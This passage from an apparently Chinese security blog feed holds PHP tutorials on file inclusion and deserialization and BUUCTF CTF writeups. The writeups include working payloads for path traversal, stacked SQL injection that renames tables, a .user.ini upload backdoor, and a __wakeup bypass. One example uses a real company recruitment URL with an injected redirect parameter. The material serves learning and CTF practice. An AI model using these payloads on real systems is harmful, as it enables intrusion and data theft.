class="php"><span class="keyword">include</span> <span class="string">"$file"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/04/znFIckEZmJLV4tu.png" alt="QQ截图20191104141806.png"></p><p>这里读取了 网站根目录之外的文件</p><p>目录遍历是一种跨越目录读取文件的方法，当PHP没有配置<code>open_basedir</code>时</p><p>文件包含漏洞可以访问任意文件。</p><p>当设置了<code>open_basedir</code>时</p><p><img src="https://i.loli.net/2019/11/04/1UznKqF6Xwgfdlb.png" alt="QQ截图20191104142837.png"></p><p><code>open_basedir</code>作用是在某个特定目录下PHP能打开的文件 这就解决了跨目录读取文件的问题。</p><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://recruit.vip.com/psc/ps/EMPLOYEE/HRMS/c/HRS_HRAM.HRS_APP_SCHJOB.GBL?languageCd=ZHS&amp;amp;LoginUser=VABIABPABOABUABTABLABOABGABIAB&amp;amp;PortalActualURL=https://www.baidu.com;PortalRegistryName=EMPLOYEE&amp;amp;PortalServletURI=https<span class="number">%3</span>a<span class="number">%2</span>f<span class="number">%2</span>frecruit.vip.com<span class="number">%2</span>fpsp<span class="number">%2</span>fps<span class="number">%2</span>f&amp;amp;PortalURI=https<span class="number">%3</span>a<span class="number">%2</span>f<span class="number">%2</span>frecruit.vip.com<span class="number">%2</span>fpsc<span class="number">%2</span>fps<span class="number">%2</span>f&amp;amp;PortalHostNode=HRMS&amp;amp;NoCrumbs=yes&amp;amp;PortalKeyStruct=yes</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP反序列化漏洞</title>
      <link href="/2019/09/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/09/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h2 id="序列化和反序列化的概念"><a href="#序列化和反序列化的概念" class="headerlink" title="序列化和反序列化的概念"></a>序列化和反序列化的概念</h2><p>序列化就是将一个对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。</p><p>反序列化则相反将字符串重新恢复成对象</p><p>对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。</p><p>ctf很多题型也都是考察PHP反序列化的相关知识</p><h2 id="PHP的序列化"><a href="#PHP的序列化" class="headerlink" title="PHP的序列化"></a>PHP的序列化</h2><p>序列化函数<code>serialize()</code></p><p>首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了</p><p><img src="https://i.loli.net/2019/09/19/t3Ekq2fH57bYGFg.png" alt="QQ截图20190919102429.png"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">3</span>:<span class="string">"Ctf"</span>:<span class="number">3</span>&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"flag"</span>;<span class="string">s:</span><span class="number">13</span>:<span class="string">"flag&#123;abedyui&#125;"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"Sch0lar"</span>;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">2</span>:<span class="string">"18"</span>;&#125;</span><br><span class="line">O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line"><span class="number">3</span> 代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line"><span class="number">3</span> 代表三个属性</span><br><span class="line">s代表字符串</span><br><span class="line"><span class="number">4</span>代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line"><span class="string">s:</span><span class="number">13</span>:<span class="string">"flag&#123;abedyui&#125;"</span> 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作。</p><p>可以再<code>__sleep()</code>方法里可以决定哪些属性被序列化</p><p>如果没有<code>__sleep()</code>方法则默认序列化所有属性</p><p><img src="https://i.loli.net/2019/09/19/iIenp1y58TH9Sgv.png" alt="QQ截图20190919144609.png"></p><p>上图<code>__sleep()</code>方法使<code>flag</code> <code>age</code> 属性序列化 name并没有被序列化</p><h2 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h2><p>根据访问控制修饰符的不同 序列化后的 属性长度和属性值会有所不同,所以这里简单提一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">public</span><span class="params">(公有)</span></span></span><br><span class="line"><span class="function"><span class="title">protected</span><span class="params">(受保护)</span></span></span><br><span class="line"><span class="function"><span class="title">private</span><span class="params">(私有的)</span></span></span><br></pre></td></tr></table></figure><p><code>protected</code>属性被序列化的时候属性值会变成<code>%00*%00属性名</code></p><p><code>private</code>属性被序列化的时候属性值会变成<code>%00类名%00属性名</code></p><p>可能有点难理解 这里我敲一下大家就懂了</p><p><img src="https://i.loli.net/2019/11/27/BhdD1NlAZpwvWzy.png" alt="QQ截图20191127080323.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:3</span><span class="selector-pseudo">:"Ctf"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="attribute">s</span>:<span class="number">7</span>:<span class="string">"Sch0lar"</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">"*age"</span>;<span class="attribute">s</span>:<span class="number">2</span>:<span class="string">"19"</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"Ctfflag"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"get flag"</span>;&#125;</span><br></pre></td></tr></table></figure><p>可以看到</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">s:</span><span class="number">6</span>:<span class="string">"*age"</span> <span class="comment">//*前后出现了两个%00也就是空白符 一个%00长度为一 所以序列化后 该属性长度为6</span></span><br><span class="line"><span class="symbol">s:</span><span class="number">9</span>:<span class="string">"Ctfflag"</span> <span class="comment">//ctf前后也就是类名前后出现两个%00 所以长度为9</span></span><br></pre></td></tr></table></figure><h2 id="PHP的反序列化"><a href="#PHP的反序列化" class="headerlink" title="PHP的反序列化"></a>PHP的反序列化</h2><p>反序列化函数<code>unserialize()</code></p><p>反序列化就是将一个序列化的字符串，还原回去</p><p><img src="https://i.loli.net/2019/09/19/ghf8QqyA5FZEaKR.png" alt="QQ截图20190919150407.png"></p><p>与 序列化函数类似 <code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code>魔术方法</p><p>如果存在则会先调用<code>__wakeup()</code>方法在进行反序列化</p><p>可以再<code>__wakeup()</code>方法中对属性进行初始化或者改变。</p><p><img src="https://i.loli.net/2019/09/19/TubrK8J2HYqO9UR.png" alt="QQ截图20190919151650.png"></p><p>反序列化之前重新给flag属性赋值</p><p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。这个大家应该都知道很常见的姿势了。为了直观一点找了些考察反序列化的ctf。</p><h2 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h2><p><img src="https://i.loli.net/2019/09/19/QBCXbFVGTg2UJed.png" alt="QQ截图20190919153615.png"></p><p>首先我们本地进行序列化后得到字符串</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"xctf"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"flag"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/27/1sQE4monBjKLNiR.png" alt="QQ截图20191127082519.png"></p><p>把1写成2 达到绕过<code>wakeup()</code>效果 拿到flag</p><p><img src="https://i.loli.net/2019/09/19/ZCzO3tgEqiDrxfN.png" alt="test.png"></p><p>找到一个 比较能总结这篇文章的题</p><p><img src="https://i.loli.net/2019/11/24/u21OeyEJw8nq3vY.png" alt="QQ截图20191124105054.png"></p><p>看到良好的备份网站习惯</p><p><code>url</code>上直接<code>/www.zip</code>下载了网站源码</p><p>index.php里发现核心代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span></span><br><span class="line"><span class="php">    $select = $_GET[<span class="string">'select'</span>];</span></span><br><span class="line"><span class="php">    $res=unserialize(@$select);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>读了<code>class.php</code> 发现需要 <code>username=admin</code> 并且 <code>password=100</code>才可以 还有一段核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/27/F1ONwZvysiWUMPe.png" alt="QQ截图20191127084929.png"></p><p>我们本地进行实例化 序列化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">a = new Name(<span class="string">'admin'</span>,100);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">b = serialize(<span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">print_r($</span><span class="bash">b);</span></span><br></pre></td></tr></table></figure><p>得到序列化后的字符串为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Name"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Nameusername"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Namepassword"</span>;<span class="attribute">i</span>:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>代码中存在 <code>__wakeup</code>前面说过。</p><p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p><p>还有因为我们要通过get方式进行提交 所以%00也必须写在url上</p><p>最终payload为</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/24/dA8cKwnp1bBkTPS.png" alt="QQ截图20191124110502.png"></p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BUUCTF web writeup</title>
      <link href="/2019/09/11/BUUCTF/"/>
      <url>/2019/09/11/BUUCTF/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/09/11/5GBRelnv39aHCzS.png" alt="QQ截图20190911174613.png"></p><a id="more"></a><p>平台web题目质量很高 有以往的一些比赛题目</p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>右键查看源代码 发现  <code>&lt;!--source.php--&gt;</code>访问<code>source.php</code>发现源码 题目考察代码审计</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $_page = mb_substr(<span class="comment">//mb_substr() 函数返回字符串的一部分</span></span></span><br><span class="line"><span class="php">                $page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)<span class="comment">//查找字符串在另一个字符串中首次出现的位置</span></span></span><br><span class="line"><span class="php">                </span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $_page = urldecode($page);</span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $_page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>第一时间没有去分析源码而是去访问了<code>hint.php</code>得到如下信息</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span> <span class="built_in">not</span> here, <span class="built_in">and</span> <span class="built_in">flag</span> <span class="built_in">in</span> ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>回头分析源码</p><p>首先<code>file</code>必须存在且必须是字符串 之后源码去访问类里面的<code>checkFile</code>方法 重点分析方法里面的内容</p><p>核心代码</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> $_page = mb_substr(</span><br><span class="line">    $_page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>大致意思就是获取?前面的数据，截断?后面的数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">_page = urldecode(<span class="variable">$page</span>);</span></span><br></pre></td></tr></table></figure><p>进行了一次url解码</p><p>所以我们构造payload如下</p><p>get会自行解码一次 程序里会自行解码一次所以我们把?进行两次编码</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file=hint.php%<span class="number">253</span>f/../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e6a6362a<span class="number">-6</span>c69<span class="number">-402</span>f-b469<span class="number">-63</span>d39794be76&#125;</span><br></pre></td></tr></table></figure><h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>2019强网杯的一道题目</p><p><img src="https://i.loli.net/2019/09/11/qYsDnTFGQAxKPNi.png" alt="QQ截图20190911201650.png"></p><p>输入</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=<span class="number">1</span>' union select <span class="number">1</span>,<span class="number">2</span> --+</span><br></pre></td></tr></table></figure><p>发现 程序使用正则过滤了一些关键字</p><p>这里我们可以用<strong>堆叠注入</strong></p><p><strong>在mysql中前语句闭合分号结束后后面的语句也会被执行</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><p>可查询出所有数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p>查询当前数据库下所有表名</p><p><img src="https://i.loli.net/2019/09/11/8REQpnTbACNIwBo.png" alt="QQ截图20190911202240.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure><p><strong>有个坑</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql中点引号( ‘ )和反勾号( ` )的区别</span><br><span class="line">linux下不区分，windows下区分</span><br><span class="line">区别: 单引号( ' )或双引号主要用于对字符串的引用符号 eg：mysql&gt; <span class="keyword">SELECT</span> <span class="string">'hello'</span>, <span class="string">"hello"</span> ; </span><br><span class="line">反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键] eg:`mysql&gt;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="symbol">`table`</span> <span class="keyword">WHERE</span> <span class="symbol">`from`</span> = <span class="string">'abc'</span> ;</span><br></pre></td></tr></table></figure><p>这里当做表名 进行查询时需要加反引号 不然会查询不出来</p><p><img src="https://i.loli.net/2019/09/11/ahTqw6vOQxI1LYC.png" alt="2.png"></p><p>查询出了flag字段名</p><p>正则过滤了select 无法查询字段数据。后看了师傅们的wp涨姿势了</p><p>题目一开始默认查询words表下的数据</p><p>猜测后端sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> words <span class="keyword">where</span> <span class="keyword">id</span>=$inject;</span><br></pre></td></tr></table></figure><p>而程序又并未过滤<code>alter</code> 和<code>rename</code></p><p>通过重命名把藏flag的表和列改成默认查询的表和列的名字 这样程序就会读到flag</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inject=1'<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">add</span> <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">1</span>;</span><br><span class="line">//因为1919810931114514只有flag字段 没有id字段 所以我们添加一个id字段</span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> words;</span><br><span class="line">//程序默认查询words表 所以我们把1919810931114514表名 改成words</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/12/S1hY9FykL7OCrDH.png" alt="QQ截图20190912162107.png"></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>suctf中的一题 当时没有写出来 出了官方wp后好好研究了一下</p><p>一个上传点 我想很多师傅想到的都是用<code>.htaccess</code>吧 然而发现不行。。</p><p>后来看了wp涨姿势了 </p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.ini文件构成的PHP后门</a></p><p><code>.user.ini</code>比<code>.htaccess</code>用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法</p><p>上传一个<code>.user.ini</code>内容为 因为程序会检测文件头所以要加一个<code>GIF98a</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF98a</span><br><span class="line">auto_prepend_file = flag.jpg</span><br></pre></td></tr></table></figure><p>指定同文件夹下的PHP都会包含flag.jpg </p><p>类似于使用了<code>include &#39;flag.jpg&#39;</code></p><p>这时候我们上传一个<code>flag.php</code></p><p><img src="https://i.loli.net/2019/09/12/mHFCvpkxjoaZnwK.png" alt="QQ截图20190912171827.png"></p><p>程序还过滤了<code>&lt;?</code> 不能写<code>&lt;?php xxx?&gt;</code>用<code>&lt;script language=&#39;php&#39;&gt;xxx&lt;/script&gt;</code>来绕过</p><p>当然内容也可以换成一句话</p><p><img src="https://i.loli.net/2019/09/12/hSxVH5NTQgdMA8b.png" alt="QQ截图20190912172138.png"></p><p>上传后 显示文件路径和文件列表 发现目录下存在index.php 这时候index.php应该是包含了flag.jpg里的内容 访问即可拿到flag</p><p><img src="https://i.loli.net/2019/09/12/Bmbgpz9SXnR1e4W.png" alt="QQ截图20190912173650.png"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="https://i.loli.net/2019/11/24/u21OeyEJw8nq3vY.png" alt="QQ截图20191124105054.png"></p><p>看到良好的备份网站习惯</p><p><code>url</code>上直接<code>/www.zip</code>下载了网站源码</p><p>index.php里发现核心代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span></span><br><span class="line"><span class="php">    $select = $_GET[<span class="string">'select'</span>];</span></span><br><span class="line"><span class="php">    $res=unserialize(@$select);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>考察反序列相关漏洞</p><p>不太了解的可以去看</p><p>先知上的这篇文章<a href="https://xz.aliyun.com/t/6753" target="_blank" rel="noopener">一文让PHP反序列化从入门到进阶</a></p><p>读了<code>class.php</code> 发现需要 <code>username=admin</code> 并且 <code>password=100</code>才可以 还有一段核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们本地进行实例化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">a = new Name(<span class="string">'admin'</span>,100);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">b = serialize(<span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">print_r($</span><span class="bash">b);</span></span><br></pre></td></tr></table></figure><p>得到序列化后的字符串为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Name"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Nameusername"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Namepassword"</span>;<span class="attribute">i</span>:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>因为反序列化之前会先调用<code>__wakeup()</code></p><p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p><p>所以我们最终提交的payload为</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span 